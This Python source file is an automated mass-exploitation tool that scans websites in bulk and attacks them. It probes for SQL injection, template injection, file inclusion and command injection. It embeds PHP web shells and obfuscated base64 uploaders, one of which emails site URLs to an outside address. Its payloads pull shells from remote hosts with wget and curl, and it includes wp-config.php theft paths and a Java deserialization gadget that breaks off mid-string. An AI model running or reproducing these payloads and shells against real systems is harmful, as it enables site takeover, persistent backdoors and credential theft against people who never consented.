import http.cookiejar
import requests, re, os, sys, codecs, random
import requests as r,re,random,sys,os
from multiprocessing.dummy import Pool
from bs4 import BeautifulSoup
from time import time as timer
import time
import warnings
import requests
import sys
import time
import smtplib
import base64
import os.path
from os import path
import json
import requests as req
from random import sample
from bs4 import BeautifulSoup
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
import string
import random
import argparse
import urllib3
from email.mime.text import MIMEText
from random import sample
from datetime import datetime
from os import system
from time import sleep
from io import StringIO
from multiprocessing.dummy import *
from multiprocessing.dummy import Pool as ThreadPool
from colorama import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
urlm = "http://www.zone-h.org/archive/notifier="
urllm = "http://zone-h.org/archive/published=0"
DowloadConfig = ['/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php','/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php','/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php']    
g = "\033[0;32m" 
r = "\033[0;31m"  
c = "\033[36m"
d = "\033[0m"
#Like always , hey , do you think i hate you ?  no really no , i really don't give a fuck abt u xD
la7mar = '\033[91m'
lazra9 = '\033[94m'
la5dhar = '\033[92m'
movv = '\033[95m'
lasfar = '\033[93m'
ramadi = '\033[90m'
blid = '\033[1m'
star = '\033[4m'
bigas = '\033[07m'
bigbbs = '\033[27m'
hell = '\033[05m'
saker = '\033[25m'
labyadh = '\033[00m'
cyan = '\033[0;96m'
P0 = "\033[0;35m"
C0 = "\033[0;36m"
C1 = "\033[1;36m"
G0 = "\033[0;32m"
G1 = "\033[1;32m"
W0 = "\033[0;37m"
W1 = "\033[1;37m"
R0 = "\033[0;31m"
R1 = "\033[1;31m"
green = "\033[0;32m"
init()
#before writing your fucking name try to see ur fucking self in the mirror :)
agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
y = time.strftime('%y')
m = time.strftime('%m')
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
shell = """GIF89a <?php echo 'RxR HaCkEr'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done');           </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
shell_contentd = req.get("https://raw.githubusercontent.com/izx2023/z/main/14.php", headers=agent).text
backdoor_param = 'vuln@123'
base_str="PGh0bWw+CjwhLS0gaXpvY2luIC0tPgo8L2h0bWw+Cgo8P3BocAoKZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKCmlmKCRfR0VUWydYJ109PSJpem8iKXsKZWNobyAiPGNlbnRlcj48Yj5VbmFtZToiLnBocF91bmFtZSgpLiI8YnI+PC9iPiI7IAplY2hvICc8Zm9udCBjb2xvcj0iYmxhY2siIHNpemU9IjQiPic7CmlmKGlzc2V0KCRfUE9TVFsnU3VibWl0J10pKXsKICAgICRmaWxlZGlyID0gIiI7IAogICAgJG1heGZpbGUgPSAnMjAwMDAwMCc7CiAgICAkbW9kZSA9ICcwNjQ0JzsKICAgICR1c2VyZmlsZV9uYW1lID0gJF9GSUxFU1snaW1hZ2UnXVsnbmFtZSddOwogICAgJHVzZXJmaWxlX3RtcCA9ICRfRklMRVNbJ2ltYWdlJ11bJ3RtcF9uYW1lJ107CiAgICBpZihpc3NldCgkX0ZJTEVTWydpbWFnZSddWyduYW1lJ10pKSB7CiAgICAgICAgJHF4ID0gJGZpbGVkaXIuJHVzZXJmaWxlX25hbWU7CiAgICAgICAgQG1vdmVfdXBsb2FkZWRfZmlsZSgkdXNlcmZpbGVfdG1wLCAkcXgpOwogICAgICAgIEBjaG1vZCAoJHF4LCBvY3RkZWMoJG1vZGUpKTsKZWNobyIgPGEgaHJlZj0kdXNlcmZpbGVfbmFtZT48Y2VudGVyPjxiPlN1Y2VzcyBVcGxvYWQgOkQgPT0+ICR1c2VyZmlsZV9uYW1lPC9iPjwvY2VudGVyPjwvYT4iOwp9Cn0KZWxzZXsKZWNobyc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKfQplY2hvICc8L2NlbnRlcj48L2ZvbnQ+JzsKCn0KPz4="
_shell=base64.b64decode(base_str)
asx = """<?php $file = fopen("izocinxc.php","w"); echo fwrite($file,'<title>Vuln!! patch it Now!</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Shell Uploaded ! :)<b><br><br>\'; }else { echo \'<b>Not uploaded ! </b><br><br>\'; }}?>'); fclose($file); ?>"""

asxd = """<?php mkdir('safeofxy', 0755);chdir('safeofxy');$a = base64_decode('PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg==');$file = fopen('izo2023.php','w');echo fwrite($file,$a);fclose($file);?>"""

p1= "{{_self.env.registerUndefinedFilterCallback(%27shell_exec%27)}}{{_self.env.getFilter(%27curl${IFS}https://raw.githubusercontent.com/izx2023/z/main/11.php${IFS}-o${IFS}11.php%27)}}"
p11= "{{_self.env.registerUndefinedFilterCallback(%27shell_exec%27)}}{{_self.env.getFilter(%27wget${IFS}-O${IFS}https://kodyapistir.com/raw/ZkW8wY6ZoG;mv${IFS}ZkW8wY6ZoG${IFS}xyz2.php%27)}}"
p2= "<%=%20IO.popen(%27wget${IFS}https://raw.githubusercontent.com/izx2023/z/main/14.php%27).readlines()%20%20%>"
p3= "{{_self.env.registerUndefinedFilterCallback(%27shell_exec%27)}}{{_self.env.getFilter(%27wget${IFS}https://raw.githubusercontent.com/izx2023/z/main/14.php%27)}}"
p4 = "${'freemarker.template.utility.Execute'?new()(%27wget${IFS}https://raw.githubusercontent.com/izx2023/z/main/14.php%27)}"
p5 = "{{config.__class__.__init__.__globals__['os'].popen(%27wget${IFS}https://raw.githubusercontent.com/izx2023/z/main/14.php%27).read()}}"
p6 = "/actions/seomatic/meta-container/meta-link-container/?uri={{craft.app.view.evaluateDynamicContent('print(system('curl\x20https://raw.githubusercontent.com/izx2023/z/main/14.php\x20>/x20iz.php'));')}}"

px = "/actions/seomatic/meta-container/meta-link-container/?uri={{5789*5789}}"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': 'humans_21909=1'}
title = "<title>Upload your files</title>"
uploader = '''
<?php
/*
Jika kamu decode file ini kamu adalah defacer kontol/1337
Encoded By Thopik
*/
eval("?>".base64_decode("PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFy
dCgpOwplY2hvIGJhc2U2NF9kZWNvZGUoIlBDRkVUME5VV1ZCRklHaDBiV3crQ2p4b2RHMXNQZ284
YUdWaFpENEtJQ0E4ZEdsMGJHVStWWEJzYjJGa0lIbHZkWElnWm1sc1pYTTgKTDNScGRHeGxQZ284
TDJobFlXUStDanhpYjJSNVBnb2dJRHhtYjNKdElHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1i
M0p0TFdSaApkR0VpSUdGamRHbHZiajBpSWlCdFpYUm9iMlE5SWxCUFUxUWlQZ29nSUNBZ1BIQStW
WEJzYjJGa0lIbHZkWElnWm1sc1pUd3ZjRDRLCklDQWdJRHhwYm5CMWRDQjBlWEJsUFNKbWFXeGxJ
aUJ1WVcxbFBTSjFjR3h2WVdSbFpGOW1hV3hsSWo0OEwybHVjSFYwUGp4aWNpQXYKUGdvZ0lDQWdQ
R2x1Y0hWMElIUjVjR1U5SW5OMVltMXBkQ0lnZG1Gc2RXVTlJbFZ3Ykc5aFpDSStQQzlwYm5CMWRE
NEtJQ0E4TDJadgpjbTArQ2p3dlltOWtlVDRLUEM5b2RHMXNQZz09Iik7Cj8+"));eval("?>".base64_decode("PD9waHAKCWZ1bmN0aW9uIFhrQWtha0FqVEhzanNhakFqcygkY29kZSl7CgkkY29kZSA9IHN0cl9z
cGxpdCgkY29kZSw1KTsKCSRpID0gMDsKCWZvcmVhY2goJGNvZGUgYXMgJHgpewoJJHggPSBzdHJf
cm90MTMoJHgpOwoJICRibGFja1skaV09ICR4OwoJJGkrKzsKCX0KCSRieXRlcyA9IGh0bWxzcGVj
aWFsY2hhcnNfZGVjb2RlKGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKGltcGxvZGUoJGJsYWNrKSkp
KTsKCWV2YWwoJz8+Jy4kYnl0ZXMpOwoJfQogPz4="));$coded = file(__FILE__);eval("?>".base64_decode("PD9waHAKZnVuY3Rpb24gZml4KCR4KXsKICR4ID0gc3RyX3JlcGxhY2UoIl9faGFsdF9jb21waWxl
cigpOyIsIiIsJHgpOwogcmV0dXJuICR4Owp9CiRYbSA9IGZpeCgkY29kZWRbY291bnQoJGNvZGVk
KS0xXSk7ClhrQWtha0FqVEhzanNhakFqcygkWG0pOwo/Pg=="));
__halt_compiler();Jmx0Oz9QSFANCiAgaWYoIWVtcHR5KCRfRklMRVNbJ3VwbG9hZGVkX2ZpbGUnXSkpDQogIHsNCiAgICAkcGF0aCA9ICZxdW90Oy4vJnF1b3Q7Ow0KICAgICRwYXRoID0gJHBhdGggLiBiYXNlbmFtZSggJF9GSUxFU1sndXBsb2FkZWRfZmlsZSddWyduYW1lJ10pOw0KICAgIGlmKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1cGxvYWRlZF9maWxlJ11bJ3RtcF9uYW1lJ10sICRwYXRoKSkgew0KICAgICAgZWNobyAmcXVvdDtUaGUgZmlsZSAmcXVvdDsuICBiYXNlbmFtZSggJF9GSUxFU1sndXBsb2FkZWRfZmlsZSddWyduYW1lJ10pLiANCiAgICAgICZxdW90OyBoYXMgYmVlbiB1cGxvYWRlZCZxdW90OzsNCiAgICB9IGVsc2V7DQogICAgICAgIGVjaG8gJnF1b3Q7VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZSwgcGxlYXNlIHRyeSBhZ2FpbiEmcXVvdDs7DQogICAgfQ0KICB9DQogLy9DaGFuZ2UgIFlvdXIgTWFpbA0KIA0KIGlmKCFpc3NldCgkX1NFU1NJT05bJnF1b3Q7dmlzaXQmcXVvdDtdKSl7DQokdXJsID0gICZxdW90O2h0dHA6Ly8mcXVvdDsuICRfU0VSVkVSWydIVFRQX0hPU1QnXS4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokaGVhZGVycyA9ICZxdW90O0Zyb206IHdlYm1hc3RlckBleGFtcGxlLmNvbSZxdW90OzsNCm1haWwoJ3JtMjE3NDcxNEBnbWFpbC5jb20nLCdXb3JkcHJlc3MgTGluayBHZW5lcmF0ZScsJHVybCwkaGVhZGVycyk7DQp9DQokX1NFU1NJT05bJnF1b3Q7dmlzaXQmcXVvdDtdID0gJnF1b3Q7b2smcXVvdDs7DQo
'''  
G = '\033[0;32m'; C = '\033[0;36m'; W = '\033[0;37m'; R = '\033[0;31m'; Y='\033[0;33m'
      
class SpyBruterV1:
    def __init__(self):
            clear = "\x1b[0m"
            colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
            x = """
                |---| Cms detect and Auto Exploited |--|
        Cracked By CodeFamilia ( More Tool Join https://t.me/xploitpriv)
                \033[91m[1] \033[95mSingle site Attack Mode
                \033[91m[2] \033[95mMass Site Attack Mode
                \033[91m[3] \033[95mZone-h attack menu
                \033[91m[4] \033[95mReverse ip Attack Mode 
                \033[91m[5] \033[95mGoogle Attack Mode 
                \033[91m[6] \033[95mBing Attack Mode                

    """

            for N, line in enumerate(x.split("\n")):
                sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
                time.sleep(0.05)
            self.sec = int(input("Choose Section: "))
            if self.sec == 1:    

                url = input("site adress write:")
                url = url.splitlines()
                readsplit = url
                xal=self.cms
            elif self.sec == 2: 
                lists = input("   Give Me List => ")
                url = open(lists, 'r').readlines()
                readsplit = url
                xal=self.cms                

            elif self.sec == 3:    

                self.zonehh()
                sys.exit()
            elif self.sec == 4: 
                self.slowprint()
                sys.exit()
            elif self.sec == 5: 
                self.google()
                sys.exit()
            elif self.sec == 6: 
                self.bigsearch()
                sys.exit()
                
            try:
                start = timer()
                print ('   [+] Executing Exploit for ' + la5dhar + str( len( readsplit ) ) + la5dhar + ' Urls.\n')

                ThreadPool = Pool(20)
                ThreadPool.map(xal, url)               

            except KeyboardInterrupt:
                exit()

            #pool.wait_completion()
            print( 'Total URLs Scanned    : ' + str( len( readsplit ) ) )
            print( 'Script Execution Time : ' + str ( timer() - start ) + ' seconds' )                
           
    def ran(self,length): 
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))
    
    def RandomGenerator(self,lenth):
        return ''.join(sample('abcdefghijklmnopqrstuvwxyz', lenth))

    def CheckSqliURL(self,url, urls):
        MaybeSqli = []
        try:
            for son in urls:
                try:
                    if '.php?' in str(son):
                        MaybeSqli.append(url + '/' + son)
                except:
                    pass

            if len(MaybeSqli) != 0:
               self.CheckSqli(MaybeSqli, url)

        except:
            print((la7mar +'[SQL]'+cyan+url+cyan+la7mar +'[Not Vuln SQL İnj]'+la7mar+ '\n'))


    def CheckSqli(self,MaybeSqli, url):
        for url in MaybeSqli:
            try:
                error = [
                'DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows',
                'is_writable',
                'mysql_Vulns', 'pg_exec', 'mysql_Vulns', 'mysql_num_rows', 'mysql_query', 'pg_query',
                'System Error',
                'io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_Vulns', 'mysqli']
                if url.startswith('http://'):
                    url = url.replace('http://', '')
                elif url.startswith('https://'):
                    url = url.replace('https://', '')
                for s in error:
                    Checksqli = requests.get('http://' + url + "'", timeout=10, headers=Headers)
                    if s in str(Checksqli.text ):
                        SQLI = url.replace("'", '')
                        if SQLI.startswith('http://'):
                            SQLI = SQLI.replace('http://', '')
                        elif SQLI.startswith('https://'):
                            SQLI = SQLI.replace('https://', '')
                        if 'http://' in SQLI:
                            pass
                        else:
                            print(la5dhar +'[SQL]'+ url + ' +++++++++++++ [Found SQL İnj]'+ '\n')
                            with open('Vulns/Sqlinjection.txt', 'a') as xx:
                                xx.write('http://' + SQLI + '\n')
                            try:
                                Username = re.findall('/home/(.*)/public_html/', str(Checksqli.text ))[0]
                                cpanel(url, Username)
                                CheckFTPport(url, Username)
                            except:
                                pass

                break
            except:
                print((la7mar +'[SQL]'+cyan+url+cyan+la7mar +'[Not Vuln SQL İnj]'+la7mar+ '\n'))

    def Checkdd(self,url, urls):
        Maybelfi = []
        try:
            for son in urls:
                try:
                    if '=' in str(son):
                        sites = url+son
                        dhon = sites

                        sites = sites.replace("https://", "")
                        sites = sites.replace("http://", "")
                        sites = sites.replace("http://", "")
                        sites = sites.replace("www.", "")
                        sites = sites.split("=")
                        sites = sites[0]
                        if sites not in Maybelfi:
                            Maybelfi.append(sites)
                            os.system('rm -rf ssi.txt')
                            open("ssi.txt", "a").write(dhon + "\n")

                            getr = open('ssi.txt').read().splitlines()

                            self.Checkssi(getr,url)


                        


                except:
                    pass

            if len(Maybelfi) != 0:
               self.Checkssi(getr,url)


        except:
            #print((yellow +'[UNK]'+white + url + red+' +++++++++++++'+yellow+ '[Notx lfı iNj]'))
            pass
        
        

    def Checkssi(self,getr,url):
        for izo in getr:
            r = requests.get(izo)

            lfiurl = r.url.rsplit('=', 1)[0]
            if lfiurl[-1] != "=":
               lfiurl = lfiurl + "="



            try:
                    

                lfis = ["5789*5789","{5789*5789}","{{5789*5789}}","{{{5789*5789}}}","{{7*'7'}}","#{5789*5789}","${5898*5898}","${{5898*5898}}","<%=5453*5453 %>","{{=5789*5789}}","${donotexists|5789*5789}","[[${5789*5789}]]"]            

                for s in lfis:

                    #print (lfiurl)
                    Checklfi = requests.get(lfiurl + s, headers=Headers, timeout=15)
                    #Checklfix = requests.get(url +'/'+ s, headers=Headers, timeout=15)
                    if "33512521" in str(Checklfi.text ):

                        print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Found SsTi Vulns]'+ '\n')
                        with open('Vulns/ssiinjection.txt', 'a') as xx:
                            xx.write(lfiurl+s + '\n' "Command:"+lfiurl+"{{_self.env.registerUndefinedFilterCallback(%27shell_exec%27)}}{{_self.env.getFilter(%27ls${IFS}-la%27)}}"+'\n\n')
                        Checks = requests.get(lfiurl + p1, headers=Headers, timeout=15)
                        Checky = requests.get(url+'/11.php', headers=Headers, timeout=15)

                        if "Shell Code" in str(Checky.text ):
                            print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Upload SSTi Shell]'+ '\n')
                            with open('Vulns/ssishell.txt', 'a') as xx:
                                xx.write(url+'/11.php' +'\n\n')
                            sys.exit()


                    elif "29735209" in str(Checklfi.text ):

                        print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Found SsTi Vulns]'+ '\n')
                        with open('Vulns/ssiinjection.txt', 'a') as xx:
                            xx.write(lfiurl+s + '\n' "Command:"+lfiurl+"<%=%20IO.popen(%27ls${IFS}-la;pwd%27).readlines()%20%20%>"+'\n\n')
                        Checksa = requests.get(lfiurl + p2, headers=Headers, timeout=15)
                        Checkya = requests.get(url+'/14.php', headers=Headers, timeout=15)
                        if "SEA-GHOST" in str(Checkya.text ):
                            print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Upload SSTi Shell]'+ '\n')
                            with open('Vulns/ssishell.txt', 'a') as xx:
                                xx.write(url+'/14.php' +'\n\n')
                            sys.exit()



                    elif "34786404" in str(Checklfi.text ):

                        print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Found SsTi Vulns]'+ '\n')
                        with open('Vulns/ssiinjection.txt', 'a') as xx:
                            xx.write(lfiurl+s + '\n' "Command:"+lfiurl+"${T(java.lang.Runtime).getRuntime().exec(%27ls${IFS}-la%27)}"+'\n\n')
                        Checksar = requests.get(lfiurl + p3, headers=Headers, timeout=15)
                        Checkyar = requests.get(url+'/14.php', headers=Headers, timeout=15)
                        if "SEA-GHOST" in str(Checkyar.text ):
                            print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Upload SSTi Shell]'+ '\n')
                            with open('Vulns/ssishell.txt', 'a') as xx:
                                xx.write(url+'/14.php' +'\n\n')
                            sys.exit()

                    elif "34786404" in str(Checklfi.text ) or "29735209" in str(Checklfi.text ):

                        print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Found SsTi Vulns]'+ '\n')
                        with open('Vulns/ssiinjection.txt', 'a') as xx:
                            xx.write(lfiurl+s + '\n' "Command:"+lfiurl+"${'freemarker.template.utility.Execute'?new()(%27ls${IFS}-la%27)}"+'\n\n')
                        Checksarr = requests.get(lfiurl + p4, headers=Headers, timeout=15)
                        Checkyarr = requests.get(url+'/14.php', headers=Headers, timeout=15)
                        if "SEA-GHOST" in str(Checkyarr.text ):
                            print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Upload SSTi Shell]'+ '\n')
                            with open('Vulns/ssishell.txt', 'a') as xx:
                                xx.write(url+'/14.php' +'\n\n')
                            sys.exit()

                    elif "7777777" in str(Checklfi.text ):

                        print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Found SsTi Vulns]'+ '\n')
                        with open('Vulns/ssiinjection.txt', 'a') as xx:
                            xx.write(lfiurl+s + '\n' "Command:"+lfiurl+"{{config.__class__.__init__.__globals__['os'].popen(%27ls${IFS}-la%27).read()}}"+'\n\n')
                        Checksar = requests.get(lfiurl + p5, headers=Headers, timeout=15)
                        Checkyar = requests.get(url+'/14.php', headers=Headers, timeout=15)
                        if "SEA-GHOST" in str(Checkyar.text ):
                            print(la5dhar +'[SsTi]'+ url + ' +++++++++++++ [Upload SSTi Shell]'+ '\n')
                            with open('Vulns/ssishell.txt', 'a') as xx:
                                xx.write(url+'/14.php' +'\n\n')
                            sys.exit()


                    else:
                        print(la7mar +'[SsTi]'+cyan+url+cyan+la7mar +'[Not Vuln ssti]'+la7mar+ '\n')
            except:
                print(la7mar +'[SsTi]'+cyan+url+cyan+la7mar +'[Not Vuln ssti]'+la7mar+ '\n')
                pass
            

    def Checkddrc(self,url, urls):
        Maybelfi = []
        try:
            for son in urls:
                try:
                    if '=' in str(son):
                        sites = url+son
                        dhon = sites

                        sites = sites.replace("https://", "")
                        sites = sites.replace("http://", "")
                        sites = sites.replace("http://", "")
                        sites = sites.replace("www.", "")
                        sites = sites.split("=")
                        sites = sites[0]
                        if sites not in Maybelfi:
                            Maybelfi.append(sites)
                            os.remove('rcebak.txt')
                            open("rcebak.txt", "a").write(dhon + "\n")
                       
                            #malo = dhon
                            #print ("this site " +malo)
                            get = open('rcebak.txt').read().splitlines()
                            #print (r.get)
                            self.Checkrces(get,url)


                        


                except:
                    pass

            if len(Maybelfi) != 0:
               self.Checkrces(get,url)


        except:
            #print((yellow +'[UNK]'+white + url + red+' +++++++++++++'+yellow+ '[Notx lfı iNj]'))
            pass


    def Checkrces(self,get,url):

        for izo in get:
            r = requests.get(izo)
            #print (r.status_code, r.url)
            lfiurl = r.url.rsplit('=', 1)[0]
            if lfiurl[-1] != "=":
               lfiurl = lfiurl + "="
            #print ("attck url>>>>" +lfiurl)


            try:
                    
                #lfis = ["{{37*47}}", "<%=%2037%20*%2047%20%>", "${{37*47}}", "#{ 37 * 47 }"]
                lfis = ["';uname;'", "'&&dir'", "'&&type C:\\boot.ini'","%27;system(%27uname%20-a%27);%27", "';phpinfo();'", "';phpinfo'", "';phpinfo();'"]            

                for s in lfis:

                    #print (lfiurl)
                    Checklfi = requests.get(lfiurl + s, headers=Headers, timeout=15)
                    if "Linux" in str(Checklfi.text ):
                    #check = re.compile("51107ed95250b4099a0f481221d56497|izocin|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", Checklfi.text)

                        print(la5dhar +'[RCE]'+ url + ' +++++++++++++ [Found RCE]'+ '\n')
                        with open('Vulns/rcen.txt', 'a') as xx:
                            xx.write(lfiurl+s + '\n')
                        sys.exit()


                    else:
                        print((la7mar +'[RCE]'+cyan+url+cyan+la7mar +'[Not Vuln RCE]'+la7mar+ '\n'))
            except:
                pass


    def ChecklfiURL(self,url, urls):
        Maybelfi = []
        try:
            for son in urls:
                try:
                    if '=' in str(son):
                        sites = url+'/'+son
                        dhon = sites
                        sites = sites.replace("https://", "")
                        sites = sites.replace("http://", "")
                        sites = sites.replace("http://", "")
                        sites = sites.replace("www.", "")
                        sites = sites.split("=")
                        sites = sites[0]
                        if sites not in Maybelfi:
                            Maybelfi.append(sites)
                            os.system('rm -rf cleaned.txt')
                            open("cleaned.txt", "a").write(dhon + "\n")
                       
                            #malo = dhon
                            #print ("this site " +malo)
                            get = open('cleaned.txt').read().splitlines()
                            self.Checklfi(get,url)
                            self.Checklfirce(get,url)

                        


                except:
                    pass

            if len(Maybelfi) != 0:
               self.Checklfi(get,url)
               self.Checklfirce(get, url)

        except:
            print((la7mar +'[LFi]'+cyan+url+cyan+la7mar +'[Not Vuln LFi]'+la7mar+ '\n'))
            pass
       
    def Checklfi(self,get,url):
        for izo in get:

            lfiurl = izo.rsplit('=', 1)[0]
            if lfiurl[-1] != "=":
               lfiurl = lfiurl + "="

            try:

                    
                lfis = ["/etc/passwd%00", "../../../../../../../../../../etc/passwd%00", "/etc/passwd", "../../../../../../../../../../etc/passwd"]                    

                for s in lfis:

                    #print (lfiurl)
                    Checklfi = requests.get(lfiurl + s, headers=Headers, timeout=15)
                    if "root:x" in str(Checklfi.text ):

                        print(la5dhar +'[LFi]'+ url + ' +++++++++++++ [Found LFi]'+ '\n')
                        with open('Vulns/Lfiinjection.txt', 'a') as xx:
                            xx.write(lfiurl+s + '\n')
                        sys.exit()
                #break
            except:
                print((la7mar +'[LFi]'+cyan+url+cyan+la7mar +'[Not Vuln LFi]'+la7mar+ '\n')) 
            
            

    def Checklfirce(self,get, url):
        for izo in get:
            lfiurl = izo.rsplit('=', 1)[0]
            if lfiurl[-1] != "=":
               lfiurl = lfiurl + "="
        
            try:

                lfic = ["/proc/self/environ","%2fproc%2fself%2f.%2fenviron","../../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/./environ%00"]


                for yym in lfic:

                    header = {'Accept':asxd}                
                    Checklfir = requests.get(lfiurl+ yym, headers=header, timeout=15)
                    Checklfirx = requests.get(url+"/safeofxy/izo2023.php", headers=Headers, timeout=15)

                    if "Shell Code" in str(Checklfirx.text ):           
                        print(la5dhar +'[LFi]'+ url + ' +++++++++++++ [Found LFi RCE]'+ '\n')
                        with open('Vulns/Lfirce.txt', 'a') as xx:
                            xx.write(url+ "/safeofxy/izo2023.php" + '\n')
                        break
                    else:
                        print((la7mar +'[LFi]'+cyan+url+cyan+la7mar +'[Not Vuln LFi RCE]'+la7mar+ '\n'))
                    pass
            except:
                print((la7mar +'[LFi]'+cyan+url+cyan+la7mar +'[Not Vuln LFi RCE]'+la7mar+ '\n'))
            pass
        pass

    def liferayx(self,url):
        command = 'lollulzkid'
        session = requests.Session()
        x = url.replace('https://', '').replace('http://', '').replace('/', '')
        try:
            command = 'lollulzkid'
            session = requests.Session()
            x = url.replace('https://', '').replace('http://', '').replace('/', '')
            headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
            response = session.get(""+url+"/api/jsonws/invoke", headers=headers,verify=False, timeout=5)
            if "Unable to deserialize object" in response.text:
                paramsPost = {"p_auth":"AdsXeCqz","tableId%3d1":"","formDate":"1526638413000","columnId":"123","defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource":"{\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A